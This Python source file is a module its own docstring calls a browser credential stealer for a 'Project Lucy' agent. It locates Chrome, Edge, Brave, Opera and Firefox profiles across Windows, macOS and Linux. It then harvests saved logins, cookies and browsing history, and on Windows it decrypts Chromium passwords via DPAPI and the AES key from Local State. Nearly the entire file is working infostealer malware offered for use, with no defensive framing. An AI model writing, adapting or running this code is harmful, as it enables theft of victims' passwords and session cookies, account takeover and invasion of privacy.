"""
Browser credential stealer for Project Lucy agent.
Extracts saved passwords, cookies, and history from Chrome/Edge/Brave (Chromium)
and Firefox. Works on Windows, Linux, macOS.
"""
import base64
import json
import os
import platform
import shutil
import sqlite3
import tempfile
from pathlib import Path

SYSTEM = platform.system()


def run(action: str = "steal", browsers: list | None = None, include: list | None = None, **kwargs) -> dict:
    """
    action: steal | cookies | history
    browsers: ['chrome', 'firefox', 'edge', 'brave'] or None (all)
    include: ['passwords', 'cookies', 'history'] or None (all)
    """
    browsers = browsers or ["chrome", "firefox", "edge", "brave", "opera"]
    include = include or ["passwords", "cookies", "history"]

    results: dict = {}
    for browser in browsers:
        try:
            data = _harvest(browser, include)
            if any(data.values()):
                results[browser] = data
        except Exception as exc:
            results[browser] = {"error": str(exc)}

    total = sum(
        len(v) for b in results.values() for k, v in b.items() if isinstance(v, list)
    )
    return {"status": "ok", "results": results, "total": total}


def _harvest(browser: str, include: list) -> dict:
    profile_paths = _find_profiles(browser)
    out: dict = {"passwords": [], "cookies": [], "history": []}

    for profile in profile_paths:
        if "passwords" in include:
            out["passwords"].extend(_chromium_passwords(profile) if browser != "firefox" else _firefox_passwords(profile))
        if "cookies" in include:
            out["cookies"].extend(_chromium_cookies(profile) if browser != "firefox" else [])
        if "history" in include:
            out["history"].extend(_chromium_history(profile) if browser != "firefox" else _firefox_history(profile))

    return out


def _find_profiles(browser: str) -> list[Path]:
    paths: list[Path] = []
    home = Path.home()

    base_map: dict[str, list[Path]] = {
        "chrome": {
            "Windows": [home / "AppData" / "Local" / "Google" / "Chrome" / "User Data"],
            "Darwin": [home / "Library" / "Application Support" / "Google" / "Chrome"],
            "Linux": [home / ".config" / "google-chrome"],
        }.get(SYSTEM, []),
        "edge": {
            "Windows": [home / "AppData" / "Local" / "Microsoft" / "Edge" / "User Data"],
            "Darwin": [home / "Library" / "Application Support" / "Microsoft Edge"],
            "Linux": [home / ".config" / "microsoft-edge"],
        }.get(SYSTEM, []),
        "brave": {
            "Windows": [home / "AppData" / "Local" / "BraveSoftware" / "Brave-Browser" / "User Data"],
            "Darwin": [home / "Library" / "Application Support" / "BraveSoftware" / "Brave-Browser"],
            "Linux": [home / ".config" / "BraveSoftware" / "Brave-Browser"],
        }.get(SYSTEM, []),
        "opera": {
            "Windows": [home / "AppData" / "Roaming" / "Opera Software" / "Opera Stable"],
            "Darwin": [home / "Library" / "Application Support" / "com.operasoftware.Opera"],
            "Linux": [home / ".config" / "opera"],
        }.get(SYSTEM, []),
        "firefox": {
            "Windows": [home / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles"],
            "Darwin": [home / "Library" / "Application Support" / "Firefox" / "Profiles"],
            "Linux": [home / ".mozilla" / "firefox"],
        }.get(SYSTEM, []),
    }

    base_dirs = base_map.get(browser, [])
    for base in base_dirs:
        if not base.exists():
            continue
        if browser == "firefox":
            for d in base.iterdir():
                if d.is_dir() and "." in d.name:
                    paths.append(d)
        else:
            for subdir in ["Default", "Profile 1", "Profile 2"]:
                p = base / subdir
                if p.exists():
                    paths.append(p)
            if not paths:
                paths.append(base)

    return paths


def _decrypt_chromium_password(encrypted: bytes) -> str:
    if SYSTEM != "Windows":
        return "(encrypted)"
    try:
        import ctypes
        import ctypes.wintypes

        DATA_BLOB_in = ctypes.create_string_buffer(encrypted, len(encrypted))
        DATA_BLOB_out = ctypes.create_string_buffer(1024)

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

        blob_in = DATA_BLOB(len(encrypted), ctypes.cast(DATA_BLOB_in, ctypes.POINTER(ctypes.c_char)))
        blob_out = DATA_BLOB()

        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        ):
            return ctypes.string_at(blob_out.pbData, blob_out.cbData).decode("utf-8", errors="replace")
    except Exception:
        pass

    if encrypted[:3] == b"v10" or encrypted[:3] == b"v11":
        try:
            key = _get_chromium_aes_key()
            if key:
                from Crypto.Cipher import AES
                iv = encrypted[3:15]
                payload = encrypted[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode("utf-8", errors="replace")
        except Exception:
            pass

    return "(encrypted)"


def _get_chromium_aes_key() -> bytes | None:
    home = Path.home()
    local_state_paths = [
        home / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Local State",
        home / "AppData" / "Local" / "Microsoft" / "Edge" / "User Data" / "Local State",
        home / "AppData" / "Local" / "BraveSoftware" / "Brave-Browser" / "User Data" / "Local State",
    ]
    for p in local_state_paths:
        if p.exists():
            try:
                state = json.loads(p.read_text(encoding="utf-8"))
                encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
                import ctypes
                key = ctypes.windll.crypt32.CryptUnprotectData
                from ctypes import wintypes, create_string_buffer, POINTER, c_char, Structure, byref, string_at

                class DATA_BLOB(Structure):
                    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]

                blob_in = create_string_buffer(encrypted_key, len(encrypted_key))

                class _D(Structure):
                    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]

                d_in = _D(len(encrypted_key), POINTER(c_char)(blob_in))
                d_out = _D()
                if ctypes.windll.crypt32.CryptUnprotectData(byref(d_in), None, None, None, None, 0, byref(d_out)):
                    return string_at(d_out.pbData, d_out.cbData)
            except Exception:
                pass
    return None


def _chromium_passwords(profile: Path) -> list[dict]:
    db_path = profile / "Login Data"
    if not db_path.exists():
        return []
    tmp = tempfile.mktemp(suffix=".db")
    shutil.copy2(str(db_path), tmp)
    results = []
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, enc_pwd in cur.fetchall():
            results.append({
                "url": url,
                "username": user,
                "password": _decrypt_chromium_password(enc_pwd) if enc_pwd else "",
            })
        con.close()
    except Exception:
        pass
    finally:
        try:
            os.unlink(tmp)
        except Exception:
            pass
    return results


def _chromium_cookies(profile: Path) -> list[dict]:
    for name in ["Cookies", "Network/Cookies"]:
        db_path = profile / name
        if db_path.exists():
            break
    else:
        return []

    tmp = tempfile.mktemp(suffix=".db")
    shutil.copy2(str(db_path), tmp)
    results = []
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("SELECT host_key, name, value FROM cookies LIMIT 500")
        for host, name, value in cur.fetchall():
            results.append({"host": host, "name": name, "value": value})
        con.close()
    except Exception:
        pass
    finally:
        try:
            os.unlink(tmp)
        except Exception:
            pass
    return results


def _chromium_history(profile: Path) -> list[dict]:
    db_path = profile / "History"
    if not db_path.exists():
        return []
    tmp = tempfile.mktemp(suffix=".db")
    shutil.copy2(str(db_path), tmp)
    results = []
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 200")
        for url, title, count in cur.fetchall():
            results.append({"url": url, "title": title, "visits": count})
        con.close()
    except Exception:
        pass
    finally:
        try:
            os.unlink(tmp)
        except Exception:
            pass
    return results


def _firefox_passwords(profile: Path) -> list[dict]:
    logins_path = profile / "logins.json"
    if not logins_path.exists():
        return []
    try:
        data = json.loads(logins_path.read_text())
        return [
            {
                "url": l.get("hostname", ""),
                "username": l.get("encryptedUsername", "(encrypted)"),
                "password": l.get("encryptedPassword", "(encrypted)"),
            }
            for l in data.get("logins", [])
        ]
    except Exception:
        return []


def _firefox_history(profile: Path) -> list[dict]:
    db_path = profile / "places.sqlite"
    if not db_path.exists():
        return []
    tmp = tempfile.mktemp(suffix=".db")
    shutil.copy2(str(db_path), tmp)
    results = []
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("SELECT url, title, visit_count FROM moz_places ORDER BY visit_count DESC LIMIT 200")
        for url, title, count in cur.fetchall():
            results.append({"url": url, "title": title, "visits": count})
        con.close()
    except Exception:
        pass
    finally:
        try:
            os.unlink(tmp)
        except Exception:
            pass
    return results
